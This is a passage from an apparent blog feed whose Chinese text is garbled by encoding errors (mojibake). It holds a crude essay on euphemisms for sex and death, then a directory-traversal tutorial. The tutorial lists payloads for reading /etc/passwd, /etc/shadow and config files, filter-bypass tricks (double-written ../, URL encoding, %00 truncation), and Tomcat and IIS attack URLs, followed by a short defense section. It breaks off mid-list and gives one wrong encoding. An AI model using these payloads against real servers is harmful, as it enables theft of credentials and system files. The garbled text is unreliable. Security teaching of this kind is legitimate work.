œè‚â€å’Œâ€œæŒŠâ€ï¼Œåº”è¯¥å¤šåŠæ˜¯ä¸€è„¸æ‡µé€¼çš„ï¼Œå®é™…ä¸Šæˆ‘ä»¬ä¼šæ›´åŠ ä¹æ„ä½¿ç”¨åè€…ï¼Œâ€œXä½ ç¥–å®—ï¼â€ã€‚</p><p>åŸå› å…¶å®å¾ˆç®€å•ï¼Œæ¯•ç«Ÿâ€œè‚â€å’Œâ€œæŒŠâ€ä¸¤ä¸ªå­—å¤ªè¿‡äºå½¢è±¡ç”ŸåŠ¨ï¼Œåè€Œæä¸èµ·ä¸­å›½äººçš„å…´è¶£ï¼Œå› ä¸ºè¶Šæ˜¯å½¢è±¡ç”ŸåŠ¨çš„å­—è¯ï¼Œè¶Šæ˜¯æ²¡æœ‰è”æƒ³ç©ºé—´ï¼›è¶Šæ²¡æœ‰è”æƒ³ç©ºé—´ï¼Œå°±è¶Šä¸éªšæ°”ä¸æµªæ¼«ã€‚æ¯”å¦‚åŒ—æ–¹ä¿—è¯­çš„â€œå¹²å¤©ï¼Œæ“åœ°ï¼Œæ—¥å¤ªé˜³â€ï¼Œé»˜å¿µä¸‰éï¼Œå¹»è‚¢å·²ç¡¬ï¼è‹¥å˜æˆäº†â€œè‚å¤©ï¼Œè‚åœ°ï¼Œè‚å¤ªé˜³â€ï¼Œå¤§å“¥èƒ½ä¸èƒ½æ¢ä¸ªè¯ï¼Ÿï¼è¡¨è¾¾å¤ªå•è°ƒå•Šã€‚</p><p>è€Œä¸”â€œè‚â€ï¼Œâ€œæŒŠâ€ä¸¤å­—å¤ªè¿‡èµ¤è£¸ï¼Œä»é£èŠ±é›ªæœˆåˆ°çœŸæªå®å¹²çš„è¿™ä¸€æ­¥éª¤ï¼Œå¦‚è‹¥ä½ ç”¨è¿™ä¿©è¯ï¼Œ233333æ˜¯ä¸æ˜¯æ€ªæ€ªçš„ï¼Œæˆ–è®¸è¿™å°±æ˜¯å§”å©‰çš„é­…åŠ›å§ï¼Œè¶Šæ˜¯æ— é™å§”å©‰ï¼Œè¶Šæ˜¯æ˜¾å¾—æ±¡åŠ›æ»”æ»”ï¼Œä¼ è¿›åƒå®¶ä¸‡æˆ·â€¦â€¦å½“ç„¶ï¼Œæ™®é€šçš„å§”å©‰è¯­å¹¶ä¸èƒ½è®©ä½ æˆä¸ºæŠŠå¦¹é«˜æ‰‹ã€‚æ»¡å˜´â€œèŠèŠ±â€â€œé»„ç“œâ€â€œæœ¨è€³â€åªä¼šè®©ä½ æ›´åŠ çŒ¥çã€‚</p><p>å…·æœ‰é«˜çº§æ„Ÿçš„å§”å©‰è¯­å¯é‡ä¸å¯æ±‚ï¼Œè¿™ä¸ªè¦åƒè€ç¥–å®—å­¦ä¹ ã€‚é¦–å…ˆè¦ä¼šåšæ¢¦ï¼Œæ¢¦æ„Ÿè¦æå¼ºï¼æœ€å¥½èƒ½ä»¤äººæµ®æƒ³è”ç¿©ã€‚æˆ˜å›½æ—¶å®‹ç‰çš„ã€Šé«˜å”èµ‹ã€‹æœ‰è¨€ï¼š</p><hr><p>æ˜”è€…å…ˆç‹æ¢¦è§ä¸€å¦‡äººæ›°ï¼šå¦¾ï¼Œå·«å±±ä¹‹å¥³ä¹Ÿï¼Œæ„¿èæ•å¸­ã€‚</p><p>å…ˆç‹é—®ï¼šä½ å¹²å˜›çš„ï¼Ÿæˆ‘å¯ä¸æ˜¯éšä¾¿çš„äºº</p><p>å¦‡äººç­”ï¼šå¦¾æ—¦ä¸ºæœäº‘ï¼Œæš®ä¸ºè¡Œé›¨ã€‚</p><hr><p>äºæ˜¯å…ˆç‹ç¡äº†ä¸€ä¸ªæ™¨å˜äº‘æœµï¼Œæ™šå˜çƒŸé›¨çš„å¥³å­ã€‚ä»–ä»¬ç¡çš„è¿‡ç¨‹å°±è¢«å¤§å®¶ç²—æš´åœ°è®¤ä¸ºæ˜¯â€œå·«å±±äº‘é›¨â€ã€‚â€œå·«å±±â€â€œäº‘é›¨â€ä¸¤ä¸ªè¯è´´åˆ‡å•Šï¼å·«å±±äº‘é›¨æ˜¯åºŠç¬«ä¹‹æ¬¢ã€‚æ›¹é›ªèŠ¹åœ¨ã€Šçº¢æ¥¼æ¢¦ã€‹ç¬¬å…­å›â€œå®ç‰åˆè¯•äº‘é›¨æƒ…â€ä¸­å†™çš„å°±æ˜¯è´¾å®ç‰ä¸ä¸«ç¯è¢­äººæˆ¿äº‹ä¹‹æ—¶çš„æƒ…æ™¯ï¼Œä½†æ­¤å¤„è´¾å®ç‰æºè¢­äººè¡Œæˆ¿äº‹æœ‰æ²¡æœ‰é‚£å•¥é‚£å•¥é‚£å•¥é‚£å•¥é‚£å•¥å¿«ä¹å’±ä»¬å°±ä¸å¾—è€ŒçŸ¥äº†ã€‚</p><p>å…¶æ¬¡è¦ä¼šè”æƒ³ï¼Œé¢ é¸¾å€’å‡¤ï¼Œé¸¾æ˜¯ç¥é¸Ÿï¼Œå‡¤å°±æ˜¯å‡¤å‡°ã€‚é¢ é¸¾å€’å‡¤çš„æœ¬æ„æ¯”å–»é¢ å€’æ¬¡åºã€‚å¦‚æœå°†é¢ é¸¾å€’å‡¤ç”¨äºäººèº«ä¸Šï¼Œå°±æœ‰äº†ç”·å¥³äº¤æ¬¢ä¹‹æ„ã€‚å…ƒä»£ç‹å®ç”«ã€Šè¥¿å¢è®°ã€‹ç¬¬å››æœ¬ç¬¬äºŒæŠ˜ä¸­æœ‰ï¼šâ€œä½ ç»£å¸·é‡Œæ•ˆç»¸ç¼ªï¼Œé¢ é¸¾å€’å‡¤ç™¾äº‹æœ‰â€çš„è®°è½½ï¼Œã€Šçº¢æ¥¼æ¢¦ã€‹ç¬¬å…­åäº”å›ä¹Ÿæœ‰â€œæ˜¯å¤œï¼Œè´¾çå’Œä»–é¢ é¸¾å€’å‡¤ï¼Œç™¾èˆ¬æ©çˆ±â€ã€‚å§¿åŠ¿å¾ˆä¸°å¯Œå˜›ã€‚ç”¨ç°åœ¨çš„è¯æ¥è¯´ï¼Œå°±æ˜¯6ï¸âƒ£9ï¸âƒ£ã€‚ä¸€æ6ï¸âƒ£9ï¸âƒ£ï¼Œè€å¸æœºä¼šå¿ƒä¸€ç¬‘ï¼Œé¢ é¸¾å€’å‡¤å°±æ˜¾å¾—æ›´åŠ è€äººå¯»å‘³ã€‚</p><p>è¯´åˆ°å†…æ¶µï¼Œå…ƒæœç‹å®ç”«åœ¨ã€Šè¥¿å¢è®°ã€‹ä¸­çš„å¦å¤–ä¸€ä¸ªè¯è¯­â€”â€”é±¼æ°´ä¹‹æ¬¢æ›´åŠ æœ‰å†…æ¶µã€‚é±¼å’Œæ°´çš„æ•…äº‹æœ€æ—©å‡ºè‡ªäºåè‘—ã€Šä¸‰å›½æ¼”ä¹‰ã€‹ä¸­ï¼Œåˆ˜å¤‡å¯¹è¯¸è‘›äº®çš„è¯„è¯­å°±æ˜¯ï¼šå¾å¾—å­”æ˜ï¼ŒçŠ¹é±¼ä¹‹å¾—æ°´ä¹Ÿã€‚å½¢å®¹èæ´½çš„åˆä½œä¼´ä¾£çš„å…³ç³»ã€‚å½“åˆä½œä¼´ä¾£å˜ä¸ºç”·äººå’Œå¥³äººçš„æ—¶å€™ï¼Œâ€œå¦‚é±¼å¾—æ°´â€ä¹Ÿå°±æ¼”å˜æˆä¸ºäº†â€œé±¼æ°´ä¹‹æ¬¢â€ã€‚è¿™ç±»è¯è¿˜æœ‰å¾ˆå¤šï¼Œâ€œäºé£ä¹‹æ„¿â€â€œäº‘æœé›¨æš®â€â€œç®¡é²ä¹‹äº¤â€â€¦â€¦ï¼ˆç”¨çš„å¼€å¿ƒï¼Œæ‰æ˜¯çœŸçš„å¥½~ï¼‰</p><p>ä½ å–œæ¬¢â€œmake loveâ€ï¼ŒğŸ‘´å–œæ¬¢â€œæœäº‘æš®é›¨â€ï¼Œä½ å–œæ¬¢â€œçº¦å—ï¼Ÿâ€ï¼ŒğŸ‘´å–œæ¬¢â€œèŠ±æ˜æœˆæš—ç¬¼è½»é›¾ï¼Œä»Šå®µå¥½å‘éƒè¾¹å»â€ã€‚ä¸­æ–‡çš„åšå¤§ç²¾æ·±åœ¨å§”å©‰è¿™é‡Œä¹ŸçœŸæ˜¯ä½“ç°å¾—æ·‹æ¼“å°½è‡´ï¼Œæ¯”èµ·ä¸€ä¸ä¸æŒ‚ï¼Œæˆ‘ä»¬æ›´å–œæ¬¢æµ´éœ¸è¿˜ä¼‘ï¼ˆbushi</p><p>è¯´æ¥ï¼Œä½ å»åŒ»é™¢å¯ä»¥ç›´æ¥ç”¨â€œèŠèŠ±â€è¿™ä¸ªè¯æ±‡æ¥è¡¨è¾¾ï¼ŒåŒ»ç”Ÿéƒ½èƒ½å¤Ÿåˆ†åˆ†é’Ÿç†è§£ä½ çš„å«ä¹‰ã€‚ä¸è¿‡ï¼Œåˆ«æŒ‡æœ›è¿™ä¸ªè¯æ±‡ä¼šå‡ºç°åœ¨ä½ çš„ç—…å†ä¸Šï¼ŒåŒ»ç”Ÿå¯æ²¡æœ‰ä½ é‚£ä¹ˆå¹½é»˜ã€‚è¯´åˆ°åŒ»é™¢å’ŒåŒ»ç”Ÿï¼Œæˆ‘ä»¬å†æ¥èŠèŠåˆ«çš„ï¼Œåˆšæ‰ä¼¼ä¹å¼€ğŸš—å¼€è¿‡å¤´äº†ï¼Œå’³å’³ã€‚</p><p>â€œå¯¹ä¸èµ·ï¼Œæˆ‘ä»¬å·²ç»å°½åŠ›äº†â€œï¼Œè¿™æ˜¯å¤§å¤«ä»¬åœ¨æŠ¢æ•‘ä¸å›æ¥ç—…äººçš„æ—¶å€™æœ€å¸¸ç”¨çš„ä¸€å¥ï¼Œç”·ä¸»ç»æœ›åœ°çœ‹ç€æŠ¢æ•‘å®¤æš—ä¸‹å»çš„ğŸ’¡ï¼Œæ— åŠ›åœ°ç˜«å€’åœ¨äº†ICUå¤–çš„å‡³å­ä¸Šï¼Œè„‘æµ·é‡Œå¼€å§‹è·‘é©¬ç¯ï¼Œå›å¿†èµ·æ¥ä»–å’Œä»–æœ€çˆ±çš„å¥³å‹â€¦â€¦å…»çš„å°ç‹—åº¦è¿‡çš„é‚£äº›å¹¸ç¦ç¬é—´â€¦â€¦</p><p>ä¸æ‰¯è¿œäº†ï¼Œæˆ‘ä»¬ç»§ç»­å›åˆ°è¯é¢˜ï¼Œè™½ç„¶è¯´ç”Ÿè€ç—…æ­»æ˜¯äººé—´å¸¸æ€ï¼Œä½†æ˜¯å¯¹äºæ­»è¿™ä¸ªå­—ï¼Œäººä»¬è¿˜æ˜¯å¾ˆæœ‰å¿Œè®³çš„ï¼Œä»å¤è‡³ä»Šï¼Œäººä»¬éƒ½åœ¨å¯»æ‰¾å¯ä»¥æ›¿ä»£æ­»å­—çš„è¯æ±‡æˆ–è€…æ˜¯è¯´æ³•ï¼Œæ¯”å¦‚ï¼š</p><hr><p>äº¡ã€æ•…ã€å’ã€å¼±ã€é€ã€æ®ã€æ®ªã€æ¯™ã€æ®‚ã€å¾‚ã€æ®’ã€è–¨ã€æ­»äº¡ã€ä¸§äº¡ã€äº¡æ•…ã€èº«æ•…ã€ç‰©æ•…ã€ç‰©åŒ–ã€å»ä¸–ã€é€ä¸–ã€å¼ƒä¸–ã€è¿‡ä¸–ã€ä¸‹ä¸–ã€å°±ä¸–ã€è°¢ä¸–ã€å‡‹è°¢ã€æ­»ç­ã€æ¯™å‘½ã€æ¯•å‘½ã€æ®’å‘½ã€æ®’ç­ã€æèƒŒã€æé¦†ã€æ®‚è½ã€å¾‚è½ã€æ®‚è°¢ã€å¾‚è°¢ã€è¿åŒ–ã€æ€›åŒ–ã€ç–¾ç»ˆã€é•¿é€ã€æ°¸è¯€ã€æ°¸åˆ«ã€æ°¸çœ ã€é•¿çœ ã€å°±æœ¨ã€æ•…å»ã€æº˜é€ã€æº˜æ­»ã€æ–­æ°”ã€å’½æ°”ã€åˆçœ¼ã€é—­çœ¼ã€æ²¡äº†ã€æŒºè…¿ã€å®Œè›‹ã€å‘œå‘¼ã€å›è€å®¶ã€ç©å„¿å®Œã€ç¿˜è¾«å­ã€ä¸Šè¥¿å¤©ã€è§é˜ç‹ã€ç™»é¬¼å½•ã€å¡«æ²Ÿå£‘ã€ç²‰èº«ç¢éª¨ã€è§é©¬å…‹æ€ã€ä¸ä¸–é•¿è¾ã€æº˜ç„¶é•¿é€ã€å¯¿ç»ˆæ­£å¯ã€å‘½èµ´é»„æ³‰ã€å‘œå‘¼å“€å“‰ã€ä¸€å‘½å‘œå‘¼ã€å¤©å¤ºå…¶é­„ã€ä»™é€ã€ä»™æ¸¸ã€åƒå¤ã€ä½œå¤ã€å½’è¥¿ã€å½’å¤©ã€å¤§æ•…ã€ä¸åœ¨ã€è¿‡å»ã€ä¸ç¦„ã€ä¸è®³ã€ä¸å¯è®³ã€è·¨é¹¤è¥¿æ¸¸ã€åƒç§‹ä¹‹åã€ç™¾å¹´ä¹‹åˆã€ä¸‰é•¿ä¸¤çŸ­ã€å±±é«˜æ°´ä½ã€è§èƒŒã€å¼ƒå…»ã€ç‰ºç‰²ã€èˆèº«ã€çŒ®èº«ã€å°±ä¹‰ã€æèº¯ã€æç”Ÿã€æ®‰èŒã€æ®‰å›½ã€æ®‰éš¾ã€æ®‰èŠ‚ã€æ®‰ã€æ•ˆæ­»ã€æ•ˆå‘½ã€æˆå‘½ã€é˜µäº¡ã€æˆä»ã€æ€èº«æˆä»ã€èˆç”Ÿå–ä¹‰ã€ä»¥èº«è®¸å›½ã€é©¬é©è£¹å°¸ã€è‚è„‘ï¼ˆèƒ†ï¼‰æ¶‚åœ°ã€æ¨ªæ­»ã€å¼ºæ­»ã€å‡¶æ­»ã€ä¸§å‘½ã€é€å‘½ã€æ¯™å‘½ã€æš´å’ã€å€’å¤´ã€æ­»äºéå‘½ã€é¥¿æ­»ã€æ®£ã€å‡å¤©ã€æ¶…ç›˜ã€ååŒ–ã€ç¾½åŒ–ã€é¹¤åŒ–ã€ç‰©åŒ–ã€åœ†å¯‚ã€å½’å¯‚ã€ç¤ºå¯‚ã€å…¥å¯‚ã€å…¥ç­ã€ç­åº¦ã€ç¤ºç­ã€å°¸è§£ã€å´©ã€é©¾å´©ã€å±±é™µå´©ã€æ™é©¾ã€å‡éã€ç™»éã€å®¾å¤©ã€å¤§è¡Œã€åƒç§‹ä¸‡å²ã€å¤­æŠ˜ã€å¤­äº¡ã€çŸ­æŠ˜ã€æ—©ä¸–ã€æ—©é€ã€æ—©æ­»ã€ä¸­æ®‡ã€æ®‡ã€å…°æ‘§ç‰æŠ˜ã€ç‰æ¥¼èµ´å¬ã€ç‰æ¥¼ä¿®è®°ã€åœ°ä¸‹ä¿®æ–‡ã€è‘¬ç‰åŸ‹é¦™ã€ç‰æ®’é¦™æ¶ˆã€é¦™æ¶ˆç‰æ®’ã€å€Ÿå¥³ç¦»é­‚ã€å®¢æ­»ã€ç˜æ­»</p><hr><p>è¿™ä¹ˆä¸€åˆ—ï¼Œæ„ˆå‘æ„Ÿè§‰äººä»¬ä¸ºäº†é¿è®³èƒ½æœ‰å¤šå¼ºçš„åˆ›é€ èƒ½åŠ›ã€‚</p><p>å­¦ä¹ ä¹‹ä½™éšä¾¿ä¾ƒä¾ƒè¿™äº›æ„Ÿè§‰å·¨é¸¡å„¿ğŸ‘ï¼Œæ”¾æ¾å¿ƒæƒ…ï¼Œä»¤äººç¥æ¸…æ°”çˆ½ï¼Œå¥½åƒé¸½äº†<code>ä¸å¸¦è„å­—çš„éª‚äººè¯´æ³•</code>ä¸¤å›äº†ï¼Œä¸‹æ¬¡ç»§ç»­ğŸ•Šï¼Œæºœ</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ‚è°ˆ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµ…è°ˆç›®å½•ç©¿è¶Š</title>
      <link href="2021/04/25/%E6%B5%85%E8%B0%88%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/"/>
      <url>2021/04/25/%E6%B5%85%E8%B0%88%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p>ç›®å½•éå†ï¼ˆç›®å½•ç©¿è¶Šï¼‰æ˜¯ä¸€ä¸ªWebå®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´è¯»å–è¿è¡Œåº”ç”¨ç¨‹åºçš„æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚ è¿™å¯èƒ½åŒ…æ‹¬åº”ç”¨ç¨‹åºä»£ç å’Œæ•°æ®ï¼Œåç«¯ç³»ç»Ÿçš„ç™»å½•ä¿¡æ¯ä»¥åŠæ•æ„Ÿçš„æ“ä½œç³»ç»Ÿæ–‡ä»¶</p><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿåœ¨æœåŠ¡å™¨ä¸Šå†™å…¥ä»»æ„æ–‡ä»¶ï¼Œï¼ˆå¦‚ï¼ŒFFFTP æ˜¯ä¸€æ¬¾å°å‹çš„ FTP å®¢æˆ·ç«¯è½¯ä»¶ã€‚FFFTPå®¢æˆ·ç«¯æ²¡æœ‰æ­£ç¡®åœ°éªŒè¯ FTP æœåŠ¡å™¨æ‰€è¿”å›çš„ LIST å‘½ä»¤å“åº”ä¸­åŒ…å«æœ‰ç›®å½•éå†åºåˆ—ï¼ˆæ–œçº¿ï¼‰çš„æ–‡ä»¶åï¼Œå¦‚æœç”¨æˆ·å—éª—ä»æ¶æ„çš„ FTP æœåŠ¡å™¨ä¸‹è½½çš„ç›®å½•åŒ…å«æœ‰å¸¦æœ‰æ¶æ„æ–‡ä»¶åçš„æ–‡ä»¶çš„è¯ï¼Œå°±å¯èƒ½å¯¼è‡´å‘ç”¨æˆ·ç³»ç»Ÿçš„ä»»æ„ä½ç½®å†™å…¥æ–‡ä»¶ï¼‰ä»è€Œå…è®¸ä»–ä»¬ä¿®æ”¹åº”ç”¨ç¨‹åºæ•°æ®æˆ–è¡Œä¸ºï¼Œå¹¶æœ€ç»ˆå®Œå…¨æ§åˆ¶æœåŠ¡å™¨</p><h1 id="å§¿åŠ¿"><a href="#å§¿åŠ¿" class="headerlink" title="å§¿åŠ¿"></a>å§¿åŠ¿</h1><h2 id="0x00-åŸºç¡€ç›®å½•éå†"><a href="#0x00-åŸºç¡€ç›®å½•éå†" class="headerlink" title="0x00 åŸºç¡€ç›®å½•éå†"></a>0x00 åŸºç¡€ç›®å½•éå†</h2><p>ç›´æ¥åˆ©ç”¨ ../ è¿”å›ä¸Šä¸€çº§æ¥éå†ä»»æ„æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h2 id="0x01-ç»å¯¹è·¯å¾„"><a href="#0x01-ç»å¯¹è·¯å¾„" class="headerlink" title="0x01 ç»å¯¹è·¯å¾„"></a>0x01 ç»å¯¹è·¯å¾„</h2><p>webç½‘ç«™æœ‰æ—¶å€™ä¼šé‡‡å–ç›®å½•éå†çš„é˜²å¾¡æªæ–½ï¼Œå¦‚è¿‡æ»¤ ../ ä¸Šä¸€çº§ç­‰å…³é”®å­—ï¼Œç„¶åç®€å•çš„è¿‡æ»¤é€šå¸¸ä¼šè¢«ç»•è¿‡ã€‚æœ‰æ—¶å€™å¯ä»¥ç›´æ¥é‡‡ç”¨ç»å¯¹è·¯å¾„ï¼Œæ— é¡» ../ è¿”å›ä¸Šä¸€çº§ç›®å½•éå†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h2 id="0x02-åŒå†™-ç»•è¿‡"><a href="#0x02-åŒå†™-ç»•è¿‡" class="headerlink" title="0x02 åŒå†™../ç»•è¿‡"></a>0x02 åŒå†™../ç»•è¿‡</h2><p>æœ‰æ—¶å€™ï¼Œé˜²å¾¡æªæ–½æ˜¯ç›´æ¥å°† ../ æ›¿æ¢ä¸ºç©ºï¼Œå¯ä»¥ç›´æ¥é‡‡ç”¨åŒå†™ç›´æ¥ç»•è¿‡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h2 id="0x03-URLç¼–ç ç»•è¿‡"><a href="#0x03-URLç¼–ç ç»•è¿‡" class="headerlink" title="0x03 URLç¼–ç ç»•è¿‡"></a>0x03 URLç¼–ç ç»•è¿‡</h2><p>ä¹Ÿå¯ä»¥é‡‡ç”¨ URL ç¼–ç æ¥ç»•è¿‡æœåŠ¡å™¨å¯¹ . æˆ–è€… / çš„æ£€æµ‹</p><blockquote><p>.  =&gt; %2c</p><p>/  =&gt; %2f</p><p>% =&gt; %25 (åŒé‡URLç¼–ç )</p></blockquote><h2 id="0x04-ç»å¯¹è·¯å¾„é…åˆ"><a href="#0x04-ç»å¯¹è·¯å¾„é…åˆ" class="headerlink" title="0x04 ç»å¯¹è·¯å¾„é…åˆ ../"></a>0x04 ç»å¯¹è·¯å¾„é…åˆ ../</h2><p>æœ‰äº› web åœ¨è·å–æ–‡ä»¶æ—¶ï¼Œä¼šé¦–å…ˆåˆ¤æ–­æ˜¯å¦ä»¥ä¸€ä¸ªå›ºå®šçš„è·¯å¾„å¼€å¤´</p><p>é‚£ä¹ˆå°±å¯ä»¥é…åˆ ../ æ¥è¿”å›ä¸Šä¸€çº§éå†ä»»æ„æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;images&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h2 id="0x05-æˆªæ–­æ–‡ä»¶åç¼€"><a href="#0x05-æˆªæ–­æ–‡ä»¶åç¼€" class="headerlink" title="0x05 æˆªæ–­æ–‡ä»¶åç¼€"></a>0x05 æˆªæ–­æ–‡ä»¶åç¼€</h2><p>æŸäº› web å¯¹æ–‡ä»¶ç±»å‹ä½œäº†é™åˆ¶ï¼Œåªæœ‰å½“åç¼€ä¸ºå›¾ç‰‡æ—¶æ‰è§£æ</p><p>è¿™æ—¶å€™å°±å¯ä»¥åˆ©ç”¨ %00 æ¥æˆªæ–­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00.jpg</span><br></pre></td></tr></table></figure><h2 id="0x0x"><a href="#0x0x" class="headerlink" title="0x0x"></a>0x0x</h2><p>è¦è¯»å–æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶çš„è¯ ../ å¯ä»¥éšæ„æ‹¼æ¥ä»»æ„ä¸ªï¼Œå°±åƒ ../../../../../../../../../../../../../../../../../../../../../../</p><p>å› ä¸ºåˆ°äº†æ ¹ç›®å½•å†è¿”å›ä¸Šçº§ç›®å½•ä¾ç„¶æ˜¯æ ¹ç›®å½•</p><h1 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h1><p>é˜²æ­¢æ–‡ä»¶è·¯å¾„éå†æ¼æ´çš„æœ€æœ‰æ•ˆæ–¹æ³•æ˜¯é¿å…å°†ç”¨æˆ·æä¾›çš„è¾“å…¥å®Œå…¨ä¼ é€’ç»™æ–‡ä»¶ç³»ç»ŸAPI</p><p>å¦‚æœè®¤ä¸ºä¸å¯é¿å…çš„æ˜¯å°†ç”¨æˆ·æä¾›çš„è¾“å…¥ä¼ é€’ç»™æ–‡ä»¶ç³»ç»Ÿ APIï¼Œåˆ™åº”åŒæ—¶ä½¿ç”¨ä¸¤å±‚é˜²å¾¡ï¼Œä»¥é˜²æ­¢å—åˆ°æ”»å‡»ï¼š</p><blockquote><ul><li>åº”ç”¨ç¨‹åºåº”åœ¨å¤„ç†ä¹‹å‰éªŒè¯ç”¨æˆ·è¾“å…¥ã€‚ç†æƒ³æƒ…å†µä¸‹ï¼ŒéªŒè¯åº”ä¸å…è®¸å€¼çš„ç™½åå•è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœæ‰€éœ€çš„åŠŸèƒ½æ— æ³•åšåˆ°è¿™ä¸€ç‚¹ï¼Œåˆ™éªŒè¯åº”éªŒè¯è¾“å…¥å†…å®¹ä»…åŒ…å«å…è®¸çš„å†…å®¹ï¼Œä¾‹å¦‚çº¯å­—æ¯æ•°å­—å­—ç¬¦</li><li>éªŒè¯æä¾›çš„è¾“å…¥åï¼Œåº”ç”¨ç¨‹åºåº”å°†è¾“å…¥é™„åŠ åˆ°åŸºæœ¬ç›®å½•ï¼Œå¹¶ä½¿ç”¨å¹³å°æ–‡ä»¶ç³»ç»Ÿ API è§„èŒƒåŒ–è·¯å¾„ã€‚éªŒè¯è§„èŒƒåŒ–è·¯å¾„ä»¥é¢„æœŸçš„åŸºæœ¬ç›®å½•å¼€å¤´</li></ul></blockquote><h1 id="æ”»å‡»è·¯å¾„æ•´ç†"><a href="#æ”»å‡»è·¯å¾„æ•´ç†" class="headerlink" title="æ”»å‡»è·¯å¾„æ•´ç†"></a>æ”»å‡»è·¯å¾„æ•´ç†</h1><h2 id="æ–‡ä»¶æ•´ç†"><a href="#æ–‡ä»¶æ•´ç†" class="headerlink" title="æ–‡ä»¶æ•´ç†"></a>æ–‡ä»¶æ•´ç†</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\drivers\etc\hosts #Win10</span><br><span class="line">C:\boot.int  #Win7 éšè—æ–‡ä»¶</span><br><span class="line">web.xml  #Java Webé¡¹ç›®é…ç½®æ–‡ä»¶  </span><br><span class="line">&#x2F;WEB-INF&#x2F;web.xml</span><br><span class="line">C:\Program Files\mysql\my.ini  #Mysqlä¸‹é…ç½®æ–‡ä»¶</span><br><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;etc&#x2F;hosts</span><br><span class="line">&#x2F;etc&#x2F;group</span><br><span class="line">&#x2F;etc&#x2F;shadow</span><br><span class="line">&#x2F;.htaccess</span><br><span class="line">&#x2F;phpinfo.php</span><br><span class="line">&#x2F;inc&#x2F;db.php</span><br><span class="line">&#x2F;inc&#x2F;conn.php</span><br><span class="line">&#x2F;Windows&#x2F;system.ini</span><br><span class="line"></span><br><span class="line"># Tomcat</span><br><span class="line">&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line"># Windows + IIS + asp</span><br><span class="line">http:&#x2F;&#x2F;test.com&#x2F;scripts&#x2F;..%5c..&#x2F;Windows&#x2F;System32&#x2F;cmd.exe?&#x2F;c+dir+c:\  # è€ç‰ˆæœ¬ - IIS CGIæ–‡ä»¶åè§£ç æ¼æ´</span><br><span class="line">http:&#x2F;&#x2F;test.com&#x2F;show.asp?view&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;Windows&#x2F;system.ini</span><br></pre></td></tr></table></figure><h2 id="è·¯å¾„æ•´ç†"><a href="#è·¯å¾„æ•´ç†" class="headerlink" title="è·¯å¾„æ•´ç†"></a>è·¯å¾„æ•´ç†</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span 